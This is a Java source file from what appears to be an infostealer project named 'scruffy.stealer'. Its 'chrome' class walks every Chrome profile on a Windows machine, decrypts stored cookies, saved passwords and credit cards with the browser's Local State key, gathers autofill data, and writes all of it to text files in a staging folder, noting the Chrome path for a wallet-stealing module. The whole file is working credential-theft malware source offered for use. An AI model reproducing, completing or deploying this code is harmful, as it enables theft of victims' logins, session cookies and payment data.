package scruffy.stealer.impl.browser;

import java.io.File;
import java.util.Arrays;
import java.util.List;

import org.apache.commons.io.FileUtils;

import scruffy.stealer.impl.coin.wallet;
import scruffy.stealer.utils.utilities;
import scruffy.stealer.utils.decrypt.decrypt_manager;

public class chrome extends utilities {

    private static List<String> names = Arrays.asList("cookie", "autofill", "creditcard", "password");
    
    private static String
		lStatePath =  System.getenv("localappdata") + "/Google/Chrome/User Data/Local State",
		
		defaultCookie =  System.getenv("localappdata") + "/Google/Chrome/User Data/Default/Network/Cookies",
		defaultWebData =  System.getenv("localappdata") + "/Google/Chrome/User Data/Default/Web Data",
		defaultLoginData = System.getenv("localappdata") + "/Google/Chrome/User Data/Default/Login Data",
		
		guestCookie = System.getenv("localappdata") + "/Google/Chrome/User Data/Guest Profile/Network/Cookies",
		guestWebData = System.getenv("localappdata") + "/Google/Chrome/User Data/Guest Profile/Web Data",
		guestLoginData = System.getenv("localappdata") + "/Google/Chrome/User Data/Guest Profile/Login Data",
		
		systemCookie = System.getenv("localappdata") + "/Google/Chrome/User Data/System Profile/Network/Cookies",
		systemWebData = System.getenv("localappdata") + "/Google/Chrome/User Data/System Profile/Web Data",
		systemLoginData = System.getenv("localappdata") + "/Google/Chrome/User Data/System Profile/Login Data";
	
	public void initialize() throws Exception {
        setup("browser/chrome/default/", defaultCookie, defaultWebData, defaultLoginData);
        setup("browser/chrome/guest/", guestCookie, guestWebData, guestLoginData);
        setup("browser/chrome/system/", systemCookie, systemWebData, systemLoginData);
        
        Arrays.stream(new File(System.getenv("localappdata") + "/Google/Chrome/User Data").listFiles(File::isDirectory))
	        .filter(x -> x.getName().startsWith("Profile ")).forEach(file -> {
	            try {
					setup(String.format("browser/chrome/%s/", file.getName().replace(" ", "_").toLowerCase()), System.getenv("localappdata") + String.format("/Google/Chrome/User Data/%s/Network/Cookies", file.getName()), System.getenv("localappdata") + String.format("/Google/Chrome/User Data/%s/Web Data", file.getName()), System.getenv("localappdata") + String.format("/Google/Chrome/User Data/%s/Login Data", file.getName()));
				} catch (Exception ignore) {}
	        }
	    );
    }

    private void setup(String path, String cookiePath, String webData, String loginData) throws Exception {
        names.forEach(name -> {
            String decryptedContent = "";
            switch (name) {
                case "cookie": {
                    decryptedContent = new decrypt_manager().getCookies(cookiePath, lStatePath);
                    break;
                }
                case "autofill": {
                    decryptedContent = new decrypt_manager().getAutofills(webData);
                    break;
                }
                case "creditcard": {
                    decryptedContent = new decrypt_manager().getCards(webData, lStatePath);
                    break;
                }
                case "password": {
                    decryptedContent = new decrypt_manager().getPasswords(loginData, lStatePath);
                    break;
                }
            }
            if (!decryptedContent.isEmpty()) {
                assert !wallet.path.containsKey("chrome");
                wallet.path.put("chrome", System.getenv("localappdata") + "/Google/Chrome/User Data/Default");
                
                try {
                    FileUtils.writeStringToFile(new File(getFolder() + "/" + path + name + ".txt"), decryptedContent, "utf-8", true);
                } catch (Exception ignore) {}
            }
        });
    }
    
}